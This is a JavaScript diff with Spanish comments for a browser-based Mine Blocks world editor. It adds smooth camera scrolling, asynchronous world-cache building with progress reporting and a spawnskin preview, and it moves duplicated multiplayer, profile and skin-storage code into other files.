@@ -8,6 +8,9 @@ const offscreenCanvas = document.createElement('canvas');
 const offscreenCtx = offscreenCanvas.getContext('2d', { alpha: false });
 offscreenCtx.imageSmoothingEnabled = false;
 
+// Lienzos del desplazamiento fluido (se crean solo cuando se activa; ver más abajo)
+let bgCanvas = null, bgCtx = null, blocksCanvas = null, blocksCtx = null;
+
 let worldDirty = true;
 let lastCameraX = null;
 let lastCameraY = null;
@@ -70,8 +73,12 @@ function updateGridDimensions() {
     grid.width = Math.ceil(canvas.width / tileSize);
     grid.height = Math.ceil(canvas.height / tileSize);
     camera.speed = 100 / currentZoom; 
-    camera.x = Math.round(camera.x);
-    camera.y = Math.round(camera.y);
+    // Con el desplazamiento fluido la cámara SÍ puede quedar entre dos cuadros (así el zoom no la mueve)
+    if (!window.smoothScroll) {
+        camera.x = Math.round(camera.x);
+        camera.y = Math.round(camera.y);
+    }
+    sizeSmoothBuffers();
     worldDirty = true; 
 }
 
@@ -121,18 +128,82 @@ window.toggleDimBackgrounds = function(enabled) {
     worldDirty = true; 
 };
 
+// ==========================================================
+// "FOTO" DEL MUNDO (worldCache): la textura que se dibuja en cada bloque.
+// Antes se llamaba a renderBlock() por cada bloque, y cada llamada pedía 12 datos
+// del bloque aunque casi todos los bloques solo necesitan 2 (tipo y variante). Con un mundo
+// grande (380 mil bloques) eso tardaba ~1.6 s. Ahora solo se piden todos los datos a los
+// bloques "especiales" (horno, pociones, agua, cultivos) y el resultado es exactamente el mismo.
+// ==========================================================
+window.worldCacheSource = new WeakMap();   // para cada foto del mundo: de qué mapa (escena) salió. Lo usan las pestañas para saber si pueden reutilizarla.
+let worldCacheToken = 0;                    // si empieza una construcción nueva, la anterior (en tandas) se cancela sola
+
+function makeWorldCacheBuilder() {
+    const scene = mbwom.scene, states = mbwom.states || {};
+    const defaultRenderer = window.renderers.default, specialRenderers = window.blockData;
+    const textureByType = new Map();   // textura de cada tipo de bloque que no tiene variante (se calcula una sola vez por tipo)
+    return function buildColumn(x, cache) {
+        const col = scene[x];
+        if (!col || !col.length) return;   // igual que antes: una columna vacía no crea nada en la foto
+        const out = cache[x] = [];
+        for (let y = 0; y < col.length; y++) {
+            const type = col[y];
+            if (type == null) continue;
+            const renderer = specialRenderers[type] || defaultRenderer;
+            let texture;
+            if (renderer === defaultRenderer) {
+                const variant = states['blockX' + x + 'Y' + y];
+                if (variant === undefined) {
+                    texture = textureByType.get(type);
+                    if (texture === undefined) { texture = getTexture(type, undefined); textureByType.set(type, texture); }
+                } else {
+                    texture = getTexture(type, variant);
+                }
+            } else {
+                texture = renderer(mbwom.getBlockState(x, y));   // bloques especiales: el camino de siempre
+            }
+            out[y] = texture;
+        }
+    };
+}
+
 function initializeWorldCache() {
+    worldCacheToken++;
     window.worldCache = [];
     if (typeof mbwom !== 'undefined' && mbwom.scene && Array.isArray(mbwom.scene)) {
-        for (let x = 0; x < mbwom.scene.length; x++) {
-            if (mbwom.scene[x]) {
-                for (let y = 0; y < mbwom.scene[x].length; y++) {
-                    renderBlock(x, y);
-                }
-            }
-        }
+        const build = makeWorldCacheBuilder();
+        for (let x = 0; x < mbwom.scene.length; x++) build(x, window.worldCache);
+        window.worldCacheSource.set(window.worldCache, mbwom.scene);
     }
     worldDirty = true;
+}
+
+// Lo mismo que initializeWorldCache(), pero por tandas de ~60 ms para poder mostrar una barra
+// de progreso REAL (onProgress recibe un número de 0 a 1) sin congelar la pantalla.
+function initializeWorldCacheAsync(onProgress) {
+    return new Promise(resolve => {
+        const token = ++worldCacheToken;
+        const cache = window.worldCache = [];
+        const scene = (typeof mbwom !== 'undefined' && mbwom.scene && Array.isArray(mbwom.scene)) ? mbwom.scene : null;
+        if (!scene) { worldDirty = true; resolve(); return; }
+        const build = makeWorldCacheBuilder();
+        const total = scene.length;
+        let x = 0;
+        const step = () => {
+            if (token !== worldCacheToken) { resolve(); return; }   // otra construcción empezó: esta ya no hace falta
+            const t0 = performance.now();
+            while (x < total && performance.now() - t0 < 60) { build(x, cache); x++; }
+            if (onProgress) onProgress(total ? x / total : 1);
+            if (x < total) {
+                (window.nextPaint ? window.nextPaint() : Promise.resolve()).then(step);
+            } else {
+                window.worldCacheSource.set(cache, scene);
+                worldDirty = true;
+                resolve();
+            }
+        };
+        step();
+    });
 }
 
 function renderBlock(x, y) {
@@ -152,9 +223,11 @@ function drawBlock(texture, values, targetCtx = ctx) {
     }
 }
 
-function renderWorldToBuffer() {
-    offscreenCtx.fillStyle = "#7385B9"; 
-    offscreenCtx.fillRect(0, 0, offscreenCanvas.width, offscreenCanvas.height);
+// Pinta el color de fondo y el fondo de la dimensión (Overworld / Nether / End) sobre un lienzo de tw x th.
+// (Antes vivía dentro de renderWorldToBuffer; se separó para que el desplazamiento fluido pueda pintarlo aparte.)
+function paintWorldBackground(tctx, tw, th) {
+    tctx.fillStyle = "#7385B9"; 
+    tctx.fillRect(0, 0, tw, th);
 
     let cS = 1;
     if (typeof mbwom !== 'undefined') {
@@ -169,11 +242,11 @@ function renderWorldToBuffer() {
         if (cS === 1 && window.images['overworld-bg']?.complete && window.images['overworld-bg'].naturalWidth > 0) {
             const bgImg = window.images['overworld-bg'];
             
-            const escalaBase = offscreenCanvas.height / bgImg.naturalHeight;
+            const escalaBase = th / bgImg.naturalHeight;
             const drawWidth = (bgImg.naturalWidth * escalaBase) * escalaZoom;
-            const drawHeight = offscreenCanvas.height * escalaZoom; 
+            const drawHeight = th * escalaZoom; 
             
-            const bgY = offscreenCanvas.height - drawHeight;
+            const bgY = th - drawHeight;
             
             // ✨ FIX: Redondeamos hacia arriba y le sumamos un pequeño margen de seguridad
             const renderW = Math.ceil(drawWidth) + 0.8;
@@ -181,8 +254,8 @@ function renderWorldToBuffer() {
             
             if (drawWidth > 0) {
                 // Avanzamos matemáticamente con el decimal, pero pintamos redondeando
-                for (let bgX = 0; bgX < offscreenCanvas.width; bgX += drawWidth) {
-                    offscreenCtx.drawImage(bgImg, Math.floor(bgX), Math.floor(bgY), renderW, renderH);
+                for (let bgX = 0; bgX < tw; bgX += drawWidth) {
+                    tctx.drawImage(bgImg, Math.floor(bgX), Math.floor(bgY), renderW, renderH);
                 }
             }
         }
@@ -201,15 +274,20 @@ function renderWorldToBuffer() {
                 const renderH = Math.ceil(drawHeight) + 0.8;
 
                 if (drawWidth > 0 && drawHeight > 0) {
-                    for (let bgX = 0; bgX < offscreenCanvas.width; bgX += drawWidth) {
-                        for (let bgY = 0; bgY < offscreenCanvas.height; bgY += drawHeight) {
-                            offscreenCtx.drawImage(bgImg, Math.floor(bgX), Math.floor(bgY), renderW, renderH);
+                    for (let bgX = 0; bgX < tw; bgX += drawWidth) {
+                        for (let bgY = 0; bgY < th; bgY += drawHeight) {
+                            tctx.drawImage(bgImg, Math.floor(bgX), Math.floor(bgY), renderW, renderH);
                         }
                     }
                 }
             }
         }
     }
+
+}
+
+function renderWorldToBuffer() {
+    paintWorldBackground(offscreenCtx, offscreenCanvas.width, offscreenCanvas.height);
 
     for (let x = 0; x < grid.width; x++) {
         for (let y = 0; y < grid.height; y++) {
@@ -264,7 +342,141 @@ function renderWorldToBuffer() {
     }
 }
 
+// ==========================================================
+// DESPLAZAMIENTO FLUIDO (Configuration > Display)
+// Normal: la cámara salta de cuadro en cuadro y el mundo se dibuja ya alineado a la cuadrícula.
+// Fluido: la cámara puede estar entre dos cuadros. Para no volver a dibujar todos los bloques en cada
+// fotograma, el mundo se dibuja UNA vez (cuando cambia el cuadro entero o se edita algo) en un lienzo con
+// un cuadro extra a la derecha y arriba, y en cada fotograma solo se "desliza" ese lienzo unos píxeles
+// (un solo drawImage). El fondo de la dimensión va en otro lienzo, porque NO se mueve con la cámara.
+// ==========================================================
+window.smoothScroll = false;
+function sizeSmoothBuffers() {
+    if (!window.smoothScroll) return;
+    if (!blocksCanvas) {
+        bgCanvas = document.createElement('canvas');
+        bgCtx = bgCanvas.getContext('2d', { alpha: false });
+        blocksCanvas = document.createElement('canvas');
+        blocksCtx = blocksCanvas.getContext('2d');
+    }
+    const W = canvas.width, H = canvas.height;
+    const pad = Math.max(1, Math.ceil(tileSize));
+    if (bgCanvas.width !== W || bgCanvas.height !== H) {
+        bgCanvas.width = W; bgCanvas.height = H;
+        bgCtx.imageSmoothingEnabled = false;
+    }
+    if (blocksCanvas.width !== W + pad || blocksCanvas.height !== H + pad) {
+        blocksCanvas.width = W + pad; blocksCanvas.height = H + pad;
+        blocksCtx.imageSmoothingEnabled = false;
+    }
+    worldDirty = true;
+}
+
+// Deja la cámara en un píxel exacto de la pantalla (así bloques, mobs y jugador no "tiemblan" entre sí)
+function snapSmoothCamera() {
+    if (!window.smoothScroll || !(tileSize > 0)) return;
+    camera.x = Math.round(camera.x * tileSize) / tileSize;
+    camera.y = Math.round(camera.y * tileSize) / tileSize;
+}
+
+window.toggleSmoothScroll = function(enabled) {
+    window.smoothScroll = !!enabled;
+    try { localStorage.setItem('mbw_smooth_scroll', enabled ? '1' : '0'); } catch (e) { /* sin almacenamiento: solo no se recuerda */ }
+    if (!window.smoothScroll) {
+        // al apagarlo la cámara vuelve a la cuadrícula
+        camera.x = Math.round(camera.x);
+        camera.y = Math.round(camera.y);
+        camera.accX = 0; camera.accY = 0;
+    }
+    camera.velX = 0; camera.velY = 0; camera._tx = undefined; camera._ty = undefined;   // sin velocidad guardada al cambiar de modo
+    camera.lastMoveTime = null;
+    sizeSmoothBuffers();
+    worldDirty = true;
+};
+
+// Lo guardado en el navegador: se aplica al arrancar y se marca la casilla
+(function loadSmoothScrollSetting() {
+    let on = false;
+    try { on = localStorage.getItem('mbw_smooth_scroll') === '1'; } catch (e) { on = false; }
+    window.smoothScroll = on;
+    const sync = function() {
+        const box = document.getElementById('smooth-scroll-toggle');
+        if (box) box.checked = window.smoothScroll;
+    };
+    sync();
+    window.addEventListener('DOMContentLoaded', sync);
+})();
+
+function renderSmoothBuffers() {
+    sizeSmoothBuffers();
+    paintWorldBackground(bgCtx, bgCanvas.width, bgCanvas.height);
+
+    const bw = blocksCanvas.width, bh = blocksCanvas.height;
+    blocksCtx.clearRect(0, 0, bw, bh);
+    const cx = Math.floor(camera.x + 1e-6), cy = Math.floor(camera.y + 1e-6);
+    const ts = tileSize;
+    const tw = Math.ceil(ts) + 0.8;
+
+    // un cuadro más a la derecha y arriba (grid.width / grid.height incluidos) para cubrir el hueco al deslizar
+    for (let x = 0; x <= grid.width; x++) {
+        for (let y = 0; y <= grid.height; y++) {
+            const blockObject = getBlockCache(cx + x, cy + y);
+            if (blockObject != null) {
+                drawBlock(blockObject, { x: Math.floor(x * ts), y: Math.floor(bh - y * ts), width: tw, height: -tw }, blocksCtx);
+            }
+        }
+    }
+
+    if (showGrid && ts >= 4) {
+        let baseOpacity = window.gridOpacity !== undefined ? window.gridOpacity / 100 : 0.2;
+        let gridOpacity = baseOpacity;
+        if (ts < 12) gridOpacity = baseOpacity * ((ts - 4) / (12 - 4));
+        blocksCtx.strokeStyle = `rgba(255, 255, 255, ${gridOpacity})`;
+        blocksCtx.lineWidth = 3;
+        blocksCtx.beginPath();
+        // la cuadrícula va dentro del mismo lienzo, así se desliza junto con los bloques
+        for (let x = 0; x <= grid.width + 1; x++) {
+            const xPos = Math.round(x * ts);
+            blocksCtx.moveTo(xPos, 0);
+            blocksCtx.lineTo(xPos, bh);
+        }
+        for (let y = 0; y <= grid.height + 1; y++) {
+            const yPos = Math.round(bh - y * ts);
+            blocksCtx.moveTo(0, yPos);
+            blocksCtx.lineTo(bw, yPos);
+        }
+        blocksCtx.stroke();
+    }
+}
+
+function drawWorldSmooth() {
+    sizeSmoothBuffers();
+    const camX = Math.floor(camera.x + 1e-6);
+    const camY = Math.floor(camera.y + 1e-6);
+    if (camX !== lastCameraX || camY !== lastCameraY || grid.width !== lastGridWidth) {
+        worldDirty = true;
+        lastCameraX = camX;
+        lastCameraY = camY;
+        lastGridWidth = grid.width;
+    }
+    if (worldDirty) {
+        renderSmoothBuffers();
+        worldDirty = false;
+    }
+    const W = canvas.width, H = canvas.height;
+    const pad = blocksCanvas.height - H;
+    // cuánto está la cámara pasada del cuadro entero, en píxeles de pantalla
+    const fx = camera.x - camX, fy = camera.y - camY;
+    let sx = Math.round(fx * tileSize);
+    let sy = Math.round(pad - fy * tileSize);      // hacia arriba en el mundo = hacia abajo en la pantalla
+    sx = Math.max(0, Math.min(sx, blocksCanvas.width - W));
+    sy = Math.max(0, Math.min(sy, blocksCanvas.height - H));
+    ctx.drawImage(bgCanvas, 0, 0);
+    ctx.drawImage(blocksCanvas, sx, sy, W, H, 0, 0, W, H);
+}
+
 function drawWorld() {
+    if (window.smoothScroll) { drawWorldSmooth(); return; }
     const camX = Math.floor(camera.x);
     const camY = Math.floor(camera.y);
 
@@ -292,6 +504,91 @@ function getBlockObject(states) {
     return renderer(states);
 }
 
+// Tamaño (en cuadros) y dibujo de cada mob. Lo usan drawMobs() y la selección con el mouse (input.js).
+// Devuelve { w, h, img, isCustomSkin }: w y h son el ancho y alto con que se DIBUJA el mob, en cuadros.
+function getMobDrawInfo(mob, noFetch) {
+    let w = 1, h = 2;
+    const t = mob.type;
+    // Dimensiones personalizadas por tipo de mob
+    if (t === 'chicken' || t === 'slime' || t === 'magmacube') {
+        w = 1; h = 1;
+    } else if (t === 'enderdragon') {
+        w = 24; h = 8;
+    } else if (t === 'nethereye' || t === 'rabbit' || t === 'bat') {
+        w = 0.75; h = 0.75;
+    } else if (t === 'pig' || t === 'wolf' || t === 'spider' || t === 'sheep') {
+        w = 2; h = 1.2;
+    } else if (t === 'enderman') {
+        w = 1.2; h = 3;
+    } else if (t === 'squid') {
+        w = 1; h = 2;
+    } else if (t === 'cow' || t === 'cowctus' || t === 'mushroom') {
+        w = 2.6; h = 2;
+    }
+
+    let img = null;
+    let isCustomSkin = false;
+    if (t === 'spawnskin' && mob.skin) {
+        img = window.getSpawnskinImage(mob.skin, noFetch);
+        isCustomSkin = true;
+        w = 1.4; h = 2;
+    } else if (t === 'spawnskin') {
+        // Spawnskin sin ID: la genérica del editor, un solo cuadro de 16x22 (antes se veía toda la tira aplastada)
+        img = window.images['spawnskin'];
+        isCustomSkin = true;
+        w = 1.4; h = 2;
+    } else if (t === 'wolf' && mob.tamed === true) {
+        // ✨ MAGIA PARA EL PERRO: Si es un lobo y está domesticado, forzamos el sprite 'dog'
+        img = window.images['dog'];
+    } else {
+        // En el juego la mooshroom y la cowctus son una "cow" con variant: se dibuja su sprite
+        let spriteKey = t;
+        if (t === 'cow') {
+            if (mob.variant === 'mooshroom') spriteKey = 'mushroom';
+            else if (mob.variant === 'cowctus') spriteKey = 'cowctus';
+        }
+        img = window.images[spriteKey];
+    }
+    if (isCustomSkin && img && img.hasFailed) img = window.images['spawnskin'];
+    return { w, h, img, isCustomSkin };
+}
+
+// ID de la skin que tendrá la spawnskin que se va a poner con la herramienta Spawn Mob (la misma regla que usa el clic):
+// si el panel del Mob Browser trae el campo skin, se usa ese ('' = sin skin); si no, la que trae la plantilla.
+function getSpawnGhostSkinId() {
+    const sp = window.currentMobSpec;
+    let sid;
+    if (sp && sp.extra && Object.prototype.hasOwnProperty.call(sp.extra, 'skin')) sid = sp.extra.skin;
+    else {
+        const tp = (typeof getMobTemplate === 'function') ? getMobTemplate('spawnskin') : null;
+        sid = tp ? tp.skin : '';
+    }
+    sid = String(sid == null ? '' : sid);
+    return /^[0-9]{1,12}$/.test(sid) ? sid : '';
+}
+
+// La "sombra" que sigue al mouse con la spawnskin: la skin REAL del ID (primer cuadro de 16x22, igual que en el mundo).
+// Mientras la skin carga, si no existe o si no hay ID, se ve la spawnskin genérica del editor (también un solo cuadro).
+function drawSpawnskinGhost() {
+    if (typeof mouse === 'undefined' || mouse.canvasX == null || mouse.canvasY == null) return;
+    const sid = getSpawnGhostSkinId();
+    let img = null;
+    if (sid && typeof window.getSpawnskinImage === 'function') {
+        const sk = window.getSpawnskinImage(sid);
+        if (sk && !sk.hasFailed) img = sk;
+    }
+    if (!(img && img.complete !== false && img.naturalWidth > 0)) img = window.images['spawnskin'];
+    if (!(img && img.complete !== false && img.naturalWidth > 0)) return;
+    const w = tileSize * 1.4, h = tileSize * 2;             // mismo tamaño que una spawnskin ya puesta (getMobDrawInfo)
+    const screenX = mouse.canvasX;
+    const screenY = canvas.height - mouse.canvasY;
+    ctx.save();
+    ctx.globalAlpha = 0.6;
+    ctx.imageSmoothingEnabled = false;
+    ctx.drawImage(img, 0, 0, Math.min(16, img.naturalWidth), Math.min(22, img.naturalHeight), screenX - (w / 2), screenY - h, w, h);
+    ctx.restore();
+}
+
 function drawMobs() {
     if (typeof mbwom === 'undefined' || !mbwom.mobs) return;
     
@@ -313,45 +610,13 @@ function drawMobs() {
                 continue;
             }
             
-            let mobWidth = tileSize * 1;
-            let mobHeight = tileSize * 2;
-            
-            // Dimensiones personalizadas por tipo de mob
-            if (mob.type === 'chicken' || mob.type === 'slime' || mob.type === 'magmacube') { 
-                mobWidth = tileSize * 1; mobHeight = tileSize * 1; 
-            } else if (mob.type === 'enderdragon') { 
-                mobWidth = tileSize * 24; mobHeight = tileSize * 8; 
-            } else if (mob.type === 'nethereye' || mob.type === 'rabbit' || mob.type === 'bat') { 
-                mobWidth = tileSize * 0.75; mobHeight = tileSize * 0.75; 
-            } else if (mob.type === 'pig' || mob.type === 'wolf' || mob.type === 'spider' || mob.type === 'sheep') { 
-                mobWidth = tileSize * 2; mobHeight = tileSize * 1.2; 
-            } else if (mob.type === 'enderman') { 
-                mobWidth = tileSize * 1.2; mobHeight = tileSize * 3; 
-            } else if (mob.type === 'squid') { 
-                mobWidth = tileSize * 1; mobHeight = tileSize * 2; 
-            } else if (mob.type === 'cow' || mob.type === 'cowctus' || mob.type === 'mushroom') { 
-                mobWidth = tileSize * 2.6; mobHeight = tileSize * 2; 
-            }
-
-            let mobImg = null;
-            let isCustomSkin = false;
-
-            if (mob.type === 'spawnskin' && mob.skin) {
-                mobImg = window.getSpawnskinImage(mob.skin);
-                isCustomSkin = true;
-                mobWidth = tileSize * 1.4; mobHeight = tileSize * 2; 
-            } else {
-                // ✨ MAGIA PARA EL PERRO: Si es un lobo y está domesticado, forzamos el sprite 'dog'
-                if (mob.type === 'wolf' && mob.tamed === true) {
-                    mobImg = window.images['dog'];
-                } else {
-                    mobImg = window.images[mob.type];
-                }
-            }
-
-            if (isCustomSkin && mobImg && mobImg.hasFailed) {
-                mobImg = window.images['spawnskin']; 
-            }
+            // Tamaño y dibujo del mob: salen de getMobDrawInfo(), la MISMA función que usa el clic del mouse,
+            // así el área donde se puede hacer clic es exactamente la que se ve en pantalla.
+            const info = getMobDrawInfo(mob);
+            const mobWidth = tileSize * info.w;
+            const mobHeight = tileSize * info.h;
+            const isCustomSkin = info.isCustomSkin;
+            const mobImg = info.img;
 
             if (mobImg && mobImg.complete && mobImg.naturalWidth > 0) {
                 ctx.save(); 
@@ -420,7 +685,7 @@ function drawMobs() {
             }
             
             if (mob.health !== undefined) {
-                let maxHp = mob.maxHealth || (typeof MOBS_HP_DB !== 'undefined' ? MOBS_HP_DB[mob.type] : 20) || 20;
+                let maxHp = mob.maxHealth || (typeof getMobMaxHealth === 'function' ? getMobMaxHealth(mob) : (typeof MOBS_HP_DB !== 'undefined' ? MOBS_HP_DB[mob.type] : 20)) || 20;
                 let currentHealth = Math.ceil(Number(mob.health));
                 let hpPercent = Math.max(0, Math.min(1, currentHealth / maxHp)); 
                 
@@ -557,7 +822,8 @@ function drawUI() {
     }
     
     if (typeof currentTool !== 'undefined' && currentTool !== 'paste' && currentTool !== 'select' && currentTool !== 'lasso') {
-        const size = (typeof toolSize !== 'undefined') ? toolSize : 1;
+        // Solo el Lápiz y el Borrador usan el tamaño del pincel; Move, Cubeta y Varita actúan sobre 1 sola casilla
+        const size = ((currentTool === 'pencil' || currentTool === 'eraser') && typeof toolSize !== 'undefined') ? toolSize : 1;
         
         const offsetStart = Math.floor(size / 2);
         const offsetEnd = Math.floor((size - 1) / 2);
@@ -633,6 +899,19 @@ function drawUI() {
             drawBlock(texture, values);
         });
         
+        // Mobs que vienen en el portapapeles (copiados con el Lazo): un cuadro punteado con su tamaño
+        if (window.clipboard.mobs && window.clipboard.mobs.length) {
+            ctx.setLineDash([4, 3]);
+            ctx.strokeStyle = "#00FFFF";
+            ctx.lineWidth = 2;
+            window.clipboard.mobs.forEach(e => {
+                const info = (typeof getMobDrawInfo === 'function') ? getMobDrawInfo(e.mob, true) : { w: 1, h: 2 };
+                const cx = (mouse.worldX + e.dx - camera.x) * tileSize;
+                const cy = canvas.height - (mouse.worldY + e.dy - camera.y) * tileSize;
+                ctx.strokeRect(cx - info.w * tileSize / 2, cy, info.w * tileSize, -info.h * tileSize);
+            });
+            ctx.setLineDash([]);
+        }
         ctx.restore();
 
         const startScreenX = (mouse.worldX - camera.x) * tileSize;
@@ -738,9 +1017,11 @@ function drawUI() {
         ctx.stroke();
     }
     
-    if (typeof currentTool !== 'undefined' && currentTool === 'spawn_mob' && typeof currentMobToSpawn !== 'undefined' && currentMobToSpawn) {
+    if (typeof currentTool !== 'undefined' && currentTool === 'spawn_mob' && typeof currentMobToSpawn !== 'undefined' && currentMobToSpawn === 'spawnskin') {
+        drawSpawnskinGhost();
+    } else if (typeof currentTool !== 'undefined' && currentTool === 'spawn_mob' && typeof currentMobToSpawn !== 'undefined' && currentMobToSpawn) {
         let mobImg = window.images[currentMobToSpawn];
-        
+
         if (mobImg && mobImg.complete && mobImg.naturalWidth > 0) {
             ctx.save();
             ctx.globalAlpha = 0.6; 
@@ -839,7 +1120,15 @@ window.updateTimeIcon = function() {
 };
 
 function mainLoop() {
+    // Sin mundo abierto (por ejemplo, al cerrar la última pestaña) no hay nada que dibujar ni mover:
+    // se deja el lienzo vacío y el bucle sigue vivo para cuando se abra otro mundo.
+    if (typeof mbwom === 'undefined' || !mbwom.scene) {
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        requestAnimationFrame(mainLoop);
+        return;
+    }
     cameraMovement();
+    snapSmoothCamera();
     mouse.calculateCoordinates();
     
     if (!window.spectatingTargetId) {
@@ -967,124 +1256,22 @@ function changeDimension(sceneIndex) {
     }
 }
 
-let multiplayerPlayerLimit = 2; 
-
-function setMpView(viewName) {
-    document.getElementById('mp-view-home').style.display = 'none';
-    document.getElementById('mp-view-create-1').style.display = 'none';
-    document.getElementById('mp-view-create-2').style.display = 'none';
-    document.getElementById('mp-view-join').style.display = 'none';
-    
-    document.getElementById('multiplayer-status').style.display = 'none';
-    document.getElementById('mp-shared-profile').style.display = 'none';
-
-    const title = document.getElementById('mp-modal-title');
-    
-    if (viewName === 'home') {
-        title.innerText = "🌐 Multiplayer";
-        document.getElementById('mp-view-home').style.display = 'flex';
-    } 
-    else if (viewName === 'create-1') {
-        title.innerText = "Create Server";
-        document.getElementById('mp-shared-profile').style.display = 'flex';
-        document.getElementById('mp-view-create-1').style.display = 'block';
-        loadMpProfile(); 
-    }
-    else if (viewName === 'create-2') {
-        title.innerText = "Server Active";
-        document.getElementById('mp-view-create-2').style.display = 'block';
-        document.getElementById('multiplayer-status').style.display = 'block'; 
-    }
-    else if (viewName === 'join') {
-        title.innerText = "Join Server";
-        document.getElementById('mp-shared-profile').style.display = 'flex';
-        document.getElementById('mp-view-join').style.display = 'block';
-        document.getElementById('multiplayer-status').style.display = 'block'; 
-        loadMpProfile(); 
-        
-        if (typeof loadPublicServers === 'function') loadPublicServers();
-    }
-}
-
-function setMpLimit(limit) {
-    multiplayerPlayerLimit = limit;
-    
-    const btns = document.querySelectorAll('.mp-limit-btn');
-    btns.forEach(btn => btn.classList.remove('selected-limit'));
-    
-    btns[limit - 1].classList.add('selected-limit');
-}
-
-function copyRoomId() {
-    const idInput = document.getElementById('my-peer-id');
-    if (idInput.value.trim() !== "") {
-        navigator.clipboard.writeText(idInput.value).then(() => {
-            const hint = document.getElementById('copy-hint');
-            hint.style.visibility = 'visible';
-            setTimeout(() => { hint.style.visibility = 'hidden'; }, 2000);
-        });
-    }
-}
-
-window.openUnifiedProfile = function() {
-    openModal('unified-profile-modal');
-    
-    const savedPic = localStorage.getItem('mbw_profile_pic') || "assets/default pfp.png";
-    const savedName = localStorage.getItem('mbw_username') || "Player";
-    
-    document.getElementById('modal-global-pfp').src = savedPic;
-    document.getElementById('global-profile-username').value = savedName;
+// Pone el ícono de dimensión (Overworld / Nether / End) según la dimensión que está abierta ahora.
+// Se usa al abrir un mundo y al cambiar de pestaña, para que el ícono no se quede con el de otro mundo.
+window.syncDimensionIcon = function () {
+    const iconElement = document.getElementById('current-dim-icon');
+    if (!iconElement || typeof mbwom === 'undefined') return;
+    const icons = { 1: "assets/Overworld icon.png", 2: "assets/Nether icon.png", 3: "assets/End icon.png" };
+    iconElement.src = icons[mbwom.currentScene || 1] || icons[1];
 };
 
-window.handleGlobalProfileUpload = function(event) {
-    const file = event.target.files[0];
-    if (file) {
-        const reader = new FileReader();
-        reader.onload = function(e) {
-            const base64Img = e.target.result;
-            localStorage.setItem('mbw_profile_pic', base64Img);
-            
-            document.getElementById('modal-global-pfp').src = base64Img;
-            
-            const topImg = document.getElementById('top-profile-img');
-            if (topImg) topImg.src = base64Img;
-            
-            const mpPreview = document.getElementById('mp-pfp-preview');
-            if (mpPreview) mpPreview.style.backgroundImage = `url(${base64Img})`;
-
-            if (typeof myPresenceRef !== 'undefined' && myPresenceRef) {
-                myPresenceRef.update({ pfp: base64Img });
-            }
-        };
-        reader.readAsDataURL(file);
-    }
-};
-
-window.handleGlobalUsernameChange = function(newName) {
-    let cleanName = newName.trim() || 'Player';
-    localStorage.setItem('mbw_username', cleanName);
-    
-    const mpUsernameInput = document.getElementById('mp-username-input');
-    if (mpUsernameInput) mpUsernameInput.value = cleanName;
-
-    if (typeof myPresenceRef !== 'undefined' && myPresenceRef) {
-        myPresenceRef.update({ username: cleanName });
-    }
-};
-
-window.addEventListener('DOMContentLoaded', () => {
-    const savedPic = localStorage.getItem('mbw_profile_pic') || "assets/default pfp.png";
-    const topImg = document.getElementById('top-profile-img');
-    if (topImg) topImg.src = savedPic;
-
-    document.body.addEventListener('click', (e) => {
-        if (e.target && (e.target.id === 'mp-pfp-preview' || e.target.id === 'mp-username-input' || e.target.closest('#mp-pfp-preview'))) {
-            e.preventDefault();
-            openUnifiedProfile();
-        }
-    });
-});
-
+// ✨ setMpView / setMpLimit / copyRoomId / multiplayerPlayerLimit: se quitaron de aquí
+// porque ya existían versiones (mejores) en scripts/multiplayer.js, y como ese archivo
+// se carga después de main.js, estas copias nunca se estaban ejecutando (código muerto).
+//
+// ✨ openUnifiedProfile / handleGlobalProfileUpload / handleGlobalUsernameChange: se
+// movieron a scripts/profile.js (junto con la versión que de verdad se usaba, la de
+// index.html, que además comprime la foto de perfil antes de guardarla).
 
 window.toggleHelpMenu = function() {
     document.getElementById("help-dropdown").classList.toggle("show");
@@ -1157,68 +1344,122 @@ window.toggleAddonsMenu = function() {
     }
 };
 
-const skinDB = {
-    dbName: "MBW_SkinsDB", storeName: "skins",
-    init: function() {
-        return new Promise((resolve, reject) => {
-            let request = indexedDB.open(this.dbName, 1);
-            request.onupgradeneeded = (e) => { let db = e.target.result; if (!db.objectStoreNames.contains(this.storeName)) db.createObjectStore(this.storeName); };
-            request.onsuccess = (e) => resolve(e.target.result); request.onerror = (e) => reject(e.target.error);
-        });
-    },
-    saveSkin: async function(id, base64Data) {
-        let db = await this.init();
-        return new Promise((resolve, reject) => {
-            let tx = db.transaction(this.storeName, "readwrite");
-            tx.objectStore(this.storeName).put({ data: base64Data, time: Date.now() }, String(id));
-            tx.oncomplete = () => resolve(); tx.onerror = () => reject();
-        });
-    },
-    getSkin: async function(id) {
-        let db = await this.init();
-        return new Promise((resolve, reject) => {
-            let tx = db.transaction(this.storeName, "readonly");
-            let req = tx.objectStore(this.storeName).get(String(id));
-            req.onsuccess = () => { let res = req.result; resolve(res ? (res.data || res) : null); };
-            req.onerror = () => resolve(null);
-        });
-    },
-    getAllSorted: async function() {
-        let db = await this.init();
-        return new Promise((resolve, reject) => {
-            let tx = db.transaction(this.storeName, "readonly");
-            let store = tx.objectStore(this.storeName);
-            let reqValues = store.getAll(); let reqKeys = store.getAllKeys();
-            tx.oncomplete = () => {
-                let values = reqValues.result || []; let keys = reqKeys.result || [];
-                let combined = keys.map((key, index) => { return { id: key, time: values[index].time || 0, base64: values[index].data || values[index] }; });
-                combined.sort((a, b) => b.time - a.time); resolve(combined);
-            };
-            tx.onerror = () => resolve([]);
-        });
-    }
-};
+// ✨ skinDB (la base de datos local de skins de mobs) se movió a scripts/file-manager.js,
+// junto a la otra base de datos local (localDB), para que todo el almacenamiento local
+// viva en un solo lugar. Aquí la seguimos usando como window.skinDB.
 
-window.skinCache = window.skinCache || {}; 
+window.skinCache = window.skinCache || {};
 window.skinFetchInProgress = window.skinFetchInProgress || {};
 
-window.getSpawnskinImage = function(skinID) {
-    if (window.skinCache[skinID]) return window.skinCache[skinID];
+// ---------------------------------------------------------------------------------------------------------------
+// Imagen de una spawnskin por su ID. Orden de búsqueda:
+//   1) assets/spawnskins/{id}.png   (las que vienen con el editor)
+//   2) la base local "skinDB"       (las que se cargaron con el Addon Spawnskins Preview)
+//   3) https://mineblocks.com/1/skins/images/{id}.png   (la web de Mine Blocks: así cualquier skin se ve sola, sin Addon)
+// El servidor manda "Access-Control-Allow-Origin: *", por eso la imagen se carga con crossOrigin="anonymous" y NO
+// "ensucia" el lienzo (las capturas de pantalla y la selección con el mouse siguen funcionando).
+// Algunas skins de la web traen el fondo en un color sólido (blanco) en vez de transparente: ese fondo se vuelve
+// transparente (solo la parte que toca el borde, así los ojos blancos de la skin se quedan).
